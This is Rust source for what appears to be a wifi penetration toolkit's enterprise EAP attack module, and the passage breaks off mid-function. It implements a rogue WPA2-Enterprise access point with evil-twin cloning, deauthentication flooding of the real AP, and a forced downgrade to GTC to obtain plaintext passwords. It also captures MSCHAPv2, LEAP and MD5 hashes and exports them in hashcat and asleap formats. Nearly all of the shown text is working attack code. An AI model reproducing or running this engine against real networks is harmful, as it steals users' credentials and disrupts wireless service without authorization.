//! Enterprise / 802.1X EAP attack engine — credential capture.
//!
//! Fake RADIUS responder with integrated rogue AP:
//!   1. Broadcast WPA2-Enterprise beacons (with optional deauth of real AP)
//!   2. Accept client auth/assoc (Open System + WPA2-Enterprise RSN IE)
//!   3. Per-client EAP state machine: Identity → Challenge → Response → Done
//!   4. Capture credentials: MSCHAPv2, LEAP, GTC (plaintext!), MD5-Challenge
//!   5. Export for hashcat/john/asleap
//!
//! Attack modes:
//!   **EvilTwin** — Clone target SSID+BSSID, deauth real AP, capture credentials
//!   **CredentialHarvest** — Rogue AP with target SSID, MSCHAPv2 default method
//!   **EapDowngrade** — Force GTC (plaintext password) regardless of client preference
//!   **IdentityTheft** — Capture usernames/domains only, no challenge (stealth)
//!   **CertBypass** — Clone target, accept all cert chains (MSCHAPv2 capture)
//!
//! Architecture (SharedAdapter):
//!   The attack runs its own beacon TX loop + RX loop in the work thread.
//!   Beacons are transmitted every `beacon_interval` TUs. Incoming frames are
//!   dispatched: auth requests → auth response, assoc requests → assoc response,
//!   EAPOL data frames → EAP state machine per client.
//!
//! Ported from `wifi-map/libwifikit/attacks/attack_eap.c` (1,155 lines).

use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::attacks::next_attack_id;
use crate::core::{EventRing, MacAddress, TxOptions};
use crate::core::chip::ChipCaps;
use crate::store::Ap;
use crate::store::update::{
    AttackId, AttackType, AttackPhase, AttackEventKind, AttackResult, StoreUpdate,
};
use crate::protocol::eap::{self, EapType};
use crate::protocol::frames;
use crate::protocol::ie::{self, ApSecurity, BeaconIeConfig};
use crate::protocol::ieee80211::{self, auth_algo, cap_info, eap as eap_const, eapol as eapol_const, fc, fc_flags, StatusCode};

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP Attack Mode
// ═══════════════════════════════════════════════════════════════════════════════

/// The 5 EAP enterprise attack modes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EapAttackMode {
    /// Clone target SSID+BSSID, deauth real AP, capture credentials.
    EvilTwin,
    /// Rogue AP with target SSID, MSCHAPv2 default method.
    CredentialHarvest,
    /// Force GTC (plaintext password) regardless of client preference.
    EapDowngrade,
    /// Capture usernames/domains only, no challenge. Stealth.
    IdentityTheft,
    /// Clone target, accept all cert chains. MSCHAPv2 capture.
    CertBypass,
}

impl EapAttackMode {
    pub fn name(&self) -> &'static str {
        match self {
            Self::EvilTwin => "Evil Twin",
            Self::CredentialHarvest => "Credential Harvest",
            Self::EapDowngrade => "EAP Downgrade",
            Self::IdentityTheft => "Identity Theft",
            Self::CertBypass => "Cert Bypass",
        }
    }

    pub fn short_name(&self) -> &'static str {
        match self {
            Self::EvilTwin => "evil-twin",
            Self::CredentialHarvest => "harvest",
            Self::EapDowngrade => "downgrade",
            Self::IdentityTheft => "identity",
            Self::CertBypass => "cert-bypass",
        }
    }

    /// Select the default EAP method to offer based on attack mode.
    fn default_method(&self) -> Option<EapType> {
        match self {
            Self::EvilTwin => Some(EapType::MsChapV2),
            Self::CredentialHarvest => Some(EapType::MsChapV2),
            Self::EapDowngrade => Some(EapType::Gtc),
            Self::IdentityTheft => None, // No challenge needed
            Self::CertBypass => Some(EapType::MsChapV2),
        }
    }
}

impl std::fmt::Display for EapAttackMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.name())
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP Parameters
// ═══════════════════════════════════════════════════════════════════════════════

/// Configuration for the EAP enterprise attack.
///
/// Targets come from the scanner's Ap struct passed to start(), NOT from here.
/// This struct holds only behavior configuration: attack mode, EAP settings, timing, limits.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct EapParams {
    // === Attack mode ===
    /// Which EAP attack mode to run.
    pub mode: EapAttackMode,

    // === EAP method ===
    /// Override the EAP method to offer. None = auto-select per mode.
    pub offered_method: Option<EapType>,
    /// Server name in MSCHAPv2/LEAP challenges. Default: "Enterprise".
    pub server_name: String,
    /// GTC prompt message. Default: "Password: ".
    pub gtc_prompt: String,
    /// Fixed MSCHAPv2 challenge (16 bytes). None = random per client.
    pub fixed_challenge: Option<[u8; 16]>,

    // === Rogue AP ===
    /// Beacon interval in TUs (1 TU = 1.024ms). Default: 100.
    pub beacon_interval: u16,
    /// BSSID for our rogue AP. None = use adapter MAC or clone target.
    pub our_bssid: Option<MacAddress>,
    /// Deauth the real AP to steal clients. Default: true for EvilTwin.
    pub deauth_original: bool,
    /// Number of deauth frames per burst. Default: 5.
    pub deauth_count: u32,
    /// Interval between deauth bursts. Default: 500ms.
    pub deauth_interval: Duration,

    // === Timing ===
    /// Per-client EAP timeout (if no response after challenge). Default: 10s.
    pub eap_timeout: Duration,
    /// Overall attack timeout (0 = run until stopped). Default: 0.
    pub timeout: Duration,
    /// Wait after channel lock. Default: 50ms.
    pub channel_settle: Duration,
    /// RX poll timeout. Default: 10ms.
    pub rx_poll_timeout: Duration,
    /// Delay after association before sending EAP-Request/Identity. Default: 50ms.
    pub eap_start_delay: Duration,

    // === Limits ===
    /// Max credentials to capture (0 = unlimited). Default: 0.
    pub max_credentials: u32,
    /// Maximum clients to track. Default: 64.
    pub max_clients: u32,
    /// Minimum RSSI to accept clients. Default: -90 dBm.
    pub rssi_min_dbm: i8,
}

impl Default for EapParams {
    fn default() -> Self {
        Self {
            mode: EapAttackMode::EvilTwin,
            offered_method: None,
            server_name: "Enterprise".to_string(),
            gtc_prompt: "Password: ".to_string(),
            fixed_challenge: None,
            beacon_interval: 100,
            our_bssid: None,
            deauth_original: true,
            deauth_count: 5,
            deauth_interval: Duration::from_millis(500),
            eap_timeout: Duration::from_secs(10),
            timeout: Duration::ZERO,
            channel_settle: Duration::from_millis(50),
            rx_poll_timeout: Duration::from_millis(10),
            eap_start_delay: Duration::from_millis(50),
            max_credentials: 0,
            max_clients: 64,
            rssi_min_dbm: -90,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP Attack Phase
// ═══════════════════════════════════════════════════════════════════════════════

/// Current phase of the EAP enterprise attack.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EapPhase {
    /// Not started.
    Idle,
    /// Setting up channel lock and rogue AP.
    Starting,
    /// Beacon TX + RX loop active, waiting for clients.
    Listening,
    /// Processing client EAP exchanges.
    Active,
    /// Attack done (timeout, max credentials reached, or stopped).
    Done,
}

impl EapPhase {
    /// Convert to the normalized AttackPhase for delta emission.
    fn to_attack_phase(&self) -> AttackPhase {
        match self {
            Self::Idle => AttackPhase { label: "Idle", is_active: false, is_terminal: false },
            Self::Starting => AttackPhase { label: "Starting", is_active: true, is_terminal: false },
            Self::Listening => AttackPhase { label: "Listening", is_active: true, is_terminal: false },
            Self::Active => AttackPhase { label: "Active", is_active: true, is_terminal: false },
            Self::Done => AttackPhase { label: "Done", is_active: false, is_terminal: true },
        }
    }
}

impl Default for EapPhase {
    fn default() -> Self {
        Self::Idle
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP Client State — per-client state machine
// ═══════════════════════════════════════════════════════════════════════════════

/// Per-client EAP session state.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClientState {
    /// Just associated, no EAP started yet.
    Idle,
    /// EAP-Request/Identity sent, waiting for response.
    IdentitySent,
    /// Identity received, challenge sent, waiting for response.
    ChallengeSent,
    /// Response received, credential captured. Done with this client.
    Done,
}

impl Default for ClientState {
    fn default() -> Self {
        Self::Idle
    }
}

/// Tracked EAP client.
#[derive(Debug, Clone)]
struct EapClient {
    /// Client MAC address.
    mac: MacAddress,
    /// Current state in EAP exchange.
    state: ClientState,
    /// Current EAP identifier (incremented per exchange step).
    eap_id: u8,
    /// Captured identity (username@domain or DOMAIN\user).
    identity: String,
    /// Extracted domain/realm from identity.
    domain: String,
    /// RSSI of last frame from this client.
    rssi: i8,
    /// Association ID assigned to this client.
    aid: u16,
    /// EAP method offered to this client.
    offered_method: Option<EapType>,
    /// MSCHAPv2 challenge sent to this client (16 bytes).
    mschapv2_challenge: [u8; 16],
    /// LEAP challenge sent to this client (8 bytes).
    leap_challenge: [u8; 8],
    /// Last EAP activity timestamp.
    last_activity: Instant,
    /// Sequence number for data frames (incremented per TX).
    seq_num: u16,
}

impl EapClient {
    fn new(mac: MacAddress, aid: u16) -> Self {
        Self {
            mac,
            state: ClientState::Idle,
            eap_id: 1,
            identity: String::new(),
            domain: String::new(),
            rssi: -100,
            aid,
            offered_method: None,
            mschapv2_challenge: [0; 16],
            leap_challenge: [0; 8],
            last_activity: Instant::now(),
            seq_num: 0,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP Credential — captured authentication material
// ═══════════════════════════════════════════════════════════════════════════════

/// A captured EAP credential. Self-contained — has everything needed for
/// cracking or export without correlating with other state.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct EapCredential {
    /// Client MAC address.
    pub client_mac: MacAddress,
    /// EAP method used to capture this credential.
    pub method: EapType,
    /// Username/identity (e.g., "user@corp.com").
    pub identity: String,
    /// Extracted domain/realm.
    pub domain: String,
    /// Client RSSI at time of capture.
    pub rssi: i8,
    /// Timestamp since attack start.
    pub timestamp: Duration,

    // === MSCHAPv2 (hashcat -m 5500) ===
    /// 16-byte authenticator challenge from us (server).
    pub mschapv2_auth_challenge: [u8; 16],
    /// 16-byte peer challenge from client.
    pub mschapv2_peer_challenge: [u8; 16],
    /// 24-byte NT-Response hash (the crackable value).
    pub mschapv2_nt_response: [u8; 24],
    /// True if MSCHAPv2 fields are populated.
    pub has_mschapv2: bool,

    // === LEAP (asleap) ===
    /// 8-byte LEAP challenge from us.
    pub leap_challenge: [u8; 8],
    /// 24-byte LEAP response from client.
    pub leap_response: [u8; 24],
    /// True if LEAP fields are populated.
    pub has_leap: bool,

    // === GTC (plaintext!) ===
    /// Plaintext password/token from GTC response.
    pub plaintext_password: String,
    /// True if plaintext field is populated.
    pub has_plaintext: bool,

    // === MD5-Challenge (hashcat -m 4800) ===
    /// 16-byte MD5 challenge from us.
    pub md5_challenge: [u8; 16],
    /// 16-byte MD5 response hash from client.
    pub md5_response: [u8; 16],
    /// EAP ID used in the MD5 exchange (needed for cracking).
    pub md5_id: u8,
    /// True if MD5 fields are populated.
    pub has_md5: bool,
}

#[allow(dead_code)]
impl EapCredential {
    fn new(client_mac: MacAddress, method: EapType, identity: &str, domain: &str, rssi: i8, timestamp: Duration) -> Self {
        Self {
            client_mac,
            method,
            identity: identity.to_string(),
            domain: domain.to_string(),
            rssi,
            timestamp,
            mschapv2_auth_challenge: [0; 16],
            mschapv2_peer_challenge: [0; 16],
            mschapv2_nt_response: [0; 24],
            has_mschapv2: false,
            leap_challenge: [0; 8],
            leap_response: [0; 24],
            has_leap: false,
            plaintext_password: String::new(),
            has_plaintext: false,
            md5_challenge: [0; 16],
            md5_response: [0; 16],
            md5_id: 0,
            has_md5: false,
        }
    }

    /// Export credential in hashcat/asleap format.
    ///
    /// Returns the formatted hash line ready for the appropriate cracking tool.
    pub fn export_hash_line(&self) -> String {
        if self.has_mschapv2 {
            // hashcat -m 5500 (NetNTLMv1 / MSCHAPv2):
            // username::::nt_response:peer_challenge+auth_challenge
            let nt = hex_encode(&self.mschapv2_nt_response);
            let peer = hex_encode(&self.mschapv2_peer_challenge);
            let auth = hex_encode(&self.mschapv2_auth_challenge);
            format!("{}::::{}:{}{}", self.identity, nt, peer, auth)
        } else if self.has_leap {
            // asleap format: challenge:response:username
            let ch = hex_encode(&self.leap_challenge);
            let resp = hex_encode(&self.leap_response);
            format!("{}:{}:{}", ch, resp, self.identity)
        } else if self.has_md5 {
            // hashcat -m 4800 (iSCSI CHAP / MD5-Challenge):
            // response:challenge:id
            let resp = hex_encode(&self.md5_response);
            let ch = hex_encode(&self.md5_challenge);
            format!("{}:{}:{:02x}", resp, ch, self.md5_id)
        } else if self.has_plaintext {
            // GTC plaintext — no cracking needed
            format!("# identity={} password={}", self.identity, self.plaintext_password)
        } else {
            // Identity only
            format!("# identity={} (no credentials)", self.identity)
        }
    }

    /// Hashcat mode number for this credential type, if applicable.
    pub fn hashcat_mode(&self) -> Option<u32> {
        if self.has_mschapv2 { Some(5500) }
        else if self.has_md5 { Some(4800) }
        else { None }
    }

    /// Cracking tool name for this credential type.
    pub fn cracking_tool(&self) -> &'static str {
        if self.has_mschapv2 { "hashcat -m 5500" }
        else if self.has_leap { "asleap" }
        else if self.has_md5 { "hashcat -m 4800" }
        else if self.has_plaintext { "none (plaintext)" }
        else { "none (identity only)" }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP Attack Info — real-time state snapshot
// ═══════════════════════════════════════════════════════════════════════════════

/// Real-time info snapshot for the CLI renderer.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct EapInfo {
    // === State ===
    pub phase: EapPhase,
    pub running: bool,
    pub mode: EapAttackMode,

    // === Target ===
    pub ssid: String,
    pub channel: u8,
    pub our_bssid: MacAddress,
    pub target_bssid: Option<MacAddress>,

    // === Method ===
    pub offered_method: Option<EapType>,

    // === Client tracking ===
    pub clients_total: u32,
    pub clients_connected: u32,
    pub clients_completed: u32,

    // === Credential counters ===
    pub identities_captured: u32,
    pub challenges_captured: u32,
    pub plaintext_captured: u32,
    pub credentials_total: u32,
    pub credential_overflow: u32,

    // === EAP exchange counters ===
    pub eap_started: u32,
    pub eap_completed: u32,
    pub eap_naks: u32,

    // === AP counters ===
    pub beacons_sent: u64,
    pub deauths_sent: u64,
    pub auth_responses_sent: u64,
    pub assoc_responses_sent: u64,

    // === Frame counters ===
    pub frames_sent: u64,
    pub frames_received: u64,

    // === Last credential info (quick-access) ===
    pub last_identity: String,
    pub last_domain: String,
    pub last_method: Option<EapType>,

    // === Timing ===
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,

    // === Credentials list (for CLI display) ===
    pub credentials: Vec<EapCredential>,

    // === TX feedback ===
    pub tx_feedback: crate::core::TxFeedbackSnapshot,
}

impl Default for EapInfo {
    fn default() -> Self {
        Self {
            phase: EapPhase::Idle,
            running: false,
            mode: EapAttackMode::EvilTwin,
            ssid: String::new(),
            channel: 0,
            our_bssid: MacAddress::ZERO,
            target_bssid: None,
            offered_method: None,
            clients_total: 0,
            clients_connected: 0,
            clients_completed: 0,
            identities_captured: 0,
            challenges_captured: 0,
            plaintext_captured: 0,
            credentials_total: 0,
            credential_overflow: 0,
            eap_started: 0,
            eap_completed: 0,
            eap_naks: 0,
            beacons_sent: 0,
            deauths_sent: 0,
            auth_responses_sent: 0,
            assoc_responses_sent: 0,
            frames_sent: 0,
            frames_received: 0,
            last_identity: String::new(),
            last_domain: String::new(),
            last_method: None,
            start_time: Instant::now(),
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
            credentials: Vec::new(),
            tx_feedback: Default::default(),
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP Attack Events — discrete things that happened
// ═══════════════════════════════════════════════════════════════════════════════

/// Discrete event during the EAP attack.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct EapEvent {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: EapEventKind,
}

#[derive(Debug, Clone)]
pub enum EapEventKind {
    /// Channel locked for rogue AP.
    ChannelLocked { channel: u8 },
    /// Rogue AP started broadcasting beacons.
    RogueApStarted { bssid: MacAddress, ssid: String },
    /// Client authenticated (Open System).
    ClientAuthenticated { mac: MacAddress, rssi: i8 },
    /// Client associated.
    ClientAssociated { mac: MacAddress, aid: u16 },
    /// EAP Identity request sent to client.
    IdentityRequestSent { mac: MacAddress },
    /// EAP Identity received from client.
    IdentityReceived { mac: MacAddress, identity: String, domain: String },
    /// EAP Challenge sent (MSCHAPv2/LEAP/GTC/MD5).
    ChallengeSent { mac: MacAddress, method: EapType },
    /// Client NAK'd our method, wants something else.
    ClientNak { mac: MacAddress, rejected: EapType, desired: Option<EapType> },
    /// Method retried after NAK (Evil Twin mode adapts).
    MethodRetried { mac: MacAddress, new_method: EapType },
    /// MSCHAPv2 hash captured!
    MsChapV2Captured { mac: MacAddress, identity: String },
    /// LEAP hash captured!
    LeapCaptured { mac: MacAddress, identity: String },
    /// GTC plaintext password captured!
    GtcCaptured { mac: MacAddress, identity: String, password: String },
    /// MD5-Challenge hash captured!
    Md5Captured { mac: MacAddress, identity: String },
    /// Identity-only credential stored (IdentityTheft mode).
    IdentityStored { mac: MacAddress, identity: String },
    /// EAP Failure sent to client (we captured what we needed).
    EapFailureSent { mac: MacAddress },
    /// Deauth burst sent to real AP.
    DeauthBurst { target_bssid: MacAddress, count: u32 },
    /// Client EAP timeout (no response).
    ClientTimeout { mac: MacAddress },
    /// Max credentials reached — attack stopping.
    MaxCredentialsReached { count: u32 },
    /// Overall timeout reached.
    TimeoutReached { elapsed: Duration },
    /// Attack complete.
    AttackComplete { credentials_total: u32, elapsed: Duration },
    /// Non-fatal error.
    Error { message: String },
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP Result — per-target outcome
// ═══════════════════════════════════════════════════════════════════════════════

/// Result for a single EAP attack target.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct EapResult {
    /// Target AP BSSID.
    pub bssid: MacAddress,
    /// Target AP SSID.
    pub ssid: String,
    /// Target AP channel.
    pub channel: u8,
    /// Attack mode used.
    pub mode: EapAttackMode,
    /// Credentials captured from this target.
    pub credentials_captured: Vec<EapCredential>,
    /// Identities captured from this target.
    pub identities_captured: Vec<String>,
    /// Time spent on this target.
    pub elapsed: Duration,
}

/// Final result after EAP attack completes (all targets).
#[allow(dead_code)]
#[derive(Debug, Clone, Default)]
pub struct EapFinalResult {
    /// Per-target results.
    pub results: Vec<EapResult>,
    /// Total credentials captured across all targets.
    pub total_credentials: u32,
    /// Total identities captured across all targets.
    pub total_identities: u32,
    /// Total attack duration.
    pub elapsed: Duration,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EapAttack — the attack engine
// ═══════════════════════════════════════════════════════════════════════════════

/// EAP enterprise credential capture attack engine.
pub struct EapAttack {
    params: EapParams,
    info: Arc<Mutex<EapInfo>>,
    events: Arc<EventRing<EapEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
}

impl EapAttack {
    pub fn new(params: EapParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(EapInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Start the EAP attack on a background thread.
    ///
    /// Target comes from the scanner's Ap struct — NOT from params.
    /// This follows the PMKID/DoS golden pattern.
    pub fn start(&self, shared: SharedAdapter, target: Ap) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let params = self.params.clone();

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.start_time = Instant::now();
            info.mode = params.mode;
            info.ssid = target.ssid.clone();
            info.channel = target.channel;
            info.target_bssid = Some(target.bssid);
            info.phase = EapPhase::Starting;
        }

        thread::Builder::new()
            .name("eap".into())
            .spawn(move || {
                let reader = shared.subscribe("eap");
                run_eap_attack(&shared, &reader, &target, &params, &info, &events, &running);
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = EapPhase::Done;
                }
            })
            .expect("failed to spawn eap thread");
    }

    pub fn signal_stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn is_done(&self) -> bool {
        self.done.load(Ordering::SeqCst)
    }

    #[allow(dead_code)]
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    pub fn info(&self) -> EapInfo {
        self.info.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    pub fn events(&self) -> Vec<EapEvent> {
        self.events.drain()
    }

    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        "eap"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Attack logic — runs on its own thread
// ═══════════════════════════════════════════════════════════════════════════════

fn run_eap_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    params: &EapParams,
    info: &Arc<Mutex<EapInfo>>,
    events: &Arc<EventRing<EapEvent>>,
    running: &Arc<AtomicBool>,
) {
    let start = Instant::now();
    let mut wait_time = Duration::ZERO;
    let tx_fb = shared.tx_feedback();
    tx_fb.reset();
    let attack_id = next_attack_id();
    let target_bssid = target.bssid;
    let channel = target.channel;

    // Emit AttackStarted delta
    shared.emit_updates(vec![StoreUpdate::AttackStarted {
        id: attack_id,
        attack_type: AttackType::Eap,
        target_bssid,
        target_ssid: target.ssid.clone(),
        target_channel: channel,
    }]);
    // TX options: max range + ACK feedback, chip-aware rate selection
    let has_he = shared.caps().contains(ChipCaps::HE);
    let tx_opts = TxOptions::max_range_ack(channel, has_he);
    let ssid = &target.ssid;

    // === Determine our AP BSSID ===
    let our_bssid = if let Some(bssid) = params.our_bssid {
        bssid
    } else if params.mode == EapAttackMode::EvilTwin || params.mode == EapAttackMode::CertBypass {
        // Clone target BSSID for evil twin
        target_bssid
    } else {
        shared.mac()
    };

    {
        let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
        i.our_bssid = our_bssid;
        i.target_bssid = Some(target_bssid);
        i.offered_method = params.offered_method.or_else(|| params.mode.default_method());
    }

    // === Lock channel ===
    if let Err(e) = shared.lock_channel(channel, "eap") {
        push_event(shared, events, start, EapEventKind::Error {
            message: format!("Channel lock failed: {}", e),
        }, attack_id);
        return;
    }
    push_event(shared, events, start, EapEventKind::ChannelLocked { channel }, attack_id);
    if params.channel_settle > Duration::ZERO {
        thread::sleep(params.channel_settle);
        wait_time += params.channel_settle;
    }

    // === Pre-build beacon IEs (WPA2-Enterprise) ===
    let beacon_ie_config = BeaconIeConfig {
        ssid: ssid.as_bytes().to_vec(),
        channel,
        security: ApSecurity::Wpa2Enterprise,
        hidden_ssid: false,
        country_code: *b"XX",
    };
    let beacon_ies = ie::build_beacon_ies(&beacon_ie_config, true);
    let probe_ies = ie::build_beacon_ies(&beacon_ie_config, false);
    let cap = cap_info::BASE | cap_info::PRIVACY;

    // Assoc response IEs (Supported Rates + HT)
    let assoc_resp_ies = {
        let mut ies = Vec::with_capacity(64);
        ies.extend(ie::build_rates(channel > 14));
        ies.extend(ie::build_ht_caps(2));
        ies
    };

    set_phase(shared, info, EapPhase::Listening, attack_id);
    push_event(shared, events, start, EapEventKind::RogueApStarted {
        bssid: our_bssid,
        ssid: ssid.clone(),
    }, attack_id);

    if !running.load(Ordering::SeqCst) {
        shared.unlock_channel();
        return;
    }

    // === State ===
    let mut clients: HashMap<[u8; 6], EapClient> = HashMap::new();
    let mut next_aid: u16 = 1;
    let mut last_beacon = Instant::now() - Duration::from_secs(1); // force immediate beacon
    let mut last_deauth = Instant::now() - Duration::from_secs(10);
    #[allow(unused_assignments)]
    let mut tsf: u64 = 0;
    let mut frames_sent: u64 = 0;
    let mut frames_received: u64 = 0;
    let mut beacons_sent: u64 = 0;
    let mut deauths_sent: u64 = 0;
    let mut auth_responses_sent: u64 = 0;
    let mut assoc_responses_sent: u64 = 0;
    let mut credentials: Vec<EapCredential> = Vec::new();

    let beacon_interval_dur = Duration::from_micros(params.beacon_interval as u64 * 1024);

    // === Main loop: beacon TX + RX dispatch ===
    while running.load(Ordering::SeqCst) {
        let now = Instant::now();
        let elapsed = now.duration_since(start);

        // --- Check overall timeout ---
        if params.timeout > Duration::ZERO && elapsed >= params.timeout {
            push_event(shared, events, start, EapEventKind::TimeoutReached { elapsed }, attack_id);
            break;
        }

        // --- Beacon TX ---
        if now.duration_since(last_beacon) >= beacon_interval_dur {
            tsf = elapsed.as_micros() as u64;
            if let Some(beacon) = frames::build_beacon(&our_bssid, tsf, params.beacon_interval, cap, &beacon_ies) {
                let _ = shared.tx_frame(&beacon, &tx_opts);
                frames_sent += 1;
                beacons_sent += 1;
            }
            last_beacon = now;
        }

        // --- Deauth real AP (Evil Twin) ---
        if params.deauth_original {
            if now.duration_since(last_deauth) >= params.deauth_interval {
                for _ in 0..params.deauth_count {
                    let deauth = frames::build_deauth(
                        &target_bssid,
                        &MacAddress::BROADCAST,
                        &target_bssid,
                        ieee80211::ReasonCode::Unspecified,
                    );
                    let _ = shared.tx_frame(&deauth, &tx_opts);
                    frames_sent += 1;
                    deauths_sent += 1;
                }
                push_event(shared, events, start, EapEventKind::DeauthBurst {
                    target_bssid,
                    count: params.deauth_count,
                }, attack_id);
                last_deauth = now;
            }
        }

        // --- Check client timeouts ---
        let timed_out_macs: Vec<[u8; 6]> = clients.iter()
            .filter(|(_, c)| {
                c.state != ClientState::Idle
                && c.state != ClientState::Done
                && now.duration_since(c.last_activity) > params.eap_timeout
            })
            .map(|(mac, _)| *mac)
            .collect();

        for mac_bytes in timed_out_macs {
            if let Some(client) = clients.get_mut(&mac_bytes) {
                push_event(shared, events, start, EapEventKind::ClientTimeout {
                    mac: client.mac,
                }, attack_id);
                // Reset to idle — they can try again
                client.state = ClientState::Idle;
                client.last_activity = now;
            }
        }

        // --- RX frame processing ---
        match reader.recv_timeout(params.rx_poll_timeout) {
            Some(frame) => {
                frames_received += 1;
                if frame.raw.len() < 24 { continue; }

                let fc0 = frame.raw[0];
                let fc1 = frame.raw[1];
                let frame_type = (fc0 >> 2) & 0x03;
                let frame_subtype = (fc0 >> 4) & 0x0F;

                match frame_type {
                    // === Management frames ===
                    0 => {
                        // Check if addressed to us (addr1 = our BSSID or broadcast)
                        let addr1 = &frame.raw[4..10];
                        if addr1 != our_bssid.as_bytes() && addr1 != MacAddress::BROADCAST.as_bytes() {
                            continue;
                        }

                        let sta_mac_bytes: [u8; 6] = frame.raw[10..16].try_into().unwrap_or([0; 6]);
                        let sta_mac = MacAddress::new(sta_mac_bytes);

                        match frame_subtype {
                            // --- Auth Request (subtype 11 = 0x0B) ---
                            11 => {
                                // Auth fields from pre-parsed frame
                                let (algo, seq) = match &frame.body {
                                    crate::core::parsed_frame::FrameBody::Auth { algorithm, seq_num, .. } => (*algorithm, *seq_num),
                                    _ => continue,
                                };

                                // Only accept Open System auth request (seq=1)
                                if algo == auth_algo::OPEN_SYSTEM && seq == 1 {
                                    // Send auth response (accept)
                                    let auth_resp = frames::build_auth_response(
                                        &sta_mac,
                                        &our_bssid,
                                        auth_algo::OPEN_SYSTEM,
                                        StatusCode::Success,
                                    );
                                    let _ = shared.tx_frame(&auth_resp, &tx_opts);
                                    frames_sent += 1;
                                    auth_responses_sent += 1;

                                    push_event(shared, events, start, EapEventKind::ClientAuthenticated {
                                        mac: sta_mac,
                                        rssi: frame.rssi,
                                    }, attack_id);
                                }
                            }

                            // --- Assoc Request (subtype 0) ---
                            0 => {
                                if frame.raw.len() < 28 { continue; }

                                // Accept the association
                                let aid = next_aid;
                                next_aid = next_aid.wrapping_add(1).max(1);

                                if let Some(assoc_resp) = frames::build_assoc_response(
                                    &sta_mac,
                                    &our_bssid,
                                    StatusCode::Success,
                                    aid,
                                    cap,
                                    &assoc_resp_ies,
                                ) {
                                    let _ = shared.tx_frame(&assoc_resp, &tx_opts);
                                    frames_sent += 1;
                                    assoc_responses_sent += 1;
                                }

                                // Check max clients before inserting
                                if !clients.contains_key(&sta_mac_bytes) && clients.len() as u32 >= params.max_clients {
                                    continue;
                                }

                                // Create or update client entry
                                let client = clients.entry(sta_mac_bytes).or_insert_with(|| {
                                    EapClient::new(sta_mac, aid)
                                });
                                client.aid = aid;
                                client.rssi = frame.rssi;
                                client.last_activity = now;

                                push_event(shared, events, start, EapEventKind::ClientAssociated {
                                    mac: sta_mac,
                                    aid,
                                }, attack_id);

                                // Trigger EAP: send Identity Request after brief settle
                                thread::sleep(params.eap_start_delay);
                                wait_time += params.eap_start_delay;

                                if client.state == ClientState::Idle || client.state == ClientState::Done {
                                    client.eap_id = 1;
                                    let eap_pkt = eap::build_eap_identity_request(client.eap_id);
                                    let eapol_frame = build_ap_data_frame(
                                        &sta_mac, &our_bssid, &eap_pkt, client.seq_num,
                                    );
                                    client.seq_num = client.seq_num.wrapping_add(1);
                                    let _ = shared.tx_frame(&eapol_frame, &tx_opts);
                                    frames_sent += 1;
                                    client.state = ClientState::IdentitySent;
                                    client.last_activity = Instant::now();

                                    push_event(shared, events, start, EapEventKind::IdentityRequestSent {
                                        mac: sta_mac,
                                    }, attack_id);

                                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                    i.eap_started += 1;
                                    i.phase = EapPhase::Active;
                                }
                            }

                            // --- Reassoc Request (subtype 2) ---
                            2 => {
                                if frame.raw.len() < 34 { continue; }

                                // Treat same as assoc
                                let aid = next_aid;
                                next_aid = next_aid.wrapping_add(1).max(1);

                                if let Some(assoc_resp) = frames::build_assoc_response(
                                    &sta_mac,
                                    &our_bssid,
                                    StatusCode::Success,
                                    aid,
                                    cap,
                                    &assoc_resp_ies,
                                ) {
                                    let _ = shared.tx_frame(&assoc_resp, &tx_opts);
                                    frames_sent += 1;
                                    assoc_responses_sent += 1;
                                }

                                let client = clients.entry(sta_mac_bytes).or_insert_with(|| {
                                    EapClient::new(sta_mac, aid)
                                });
                                client.aid = aid;
                                client.rssi = frame.rssi;
                                client.last_activity = now;

                                push_event(shared, events, start, EapEventKind::ClientAssociated {
                                    mac: sta_mac,
                                    aid,
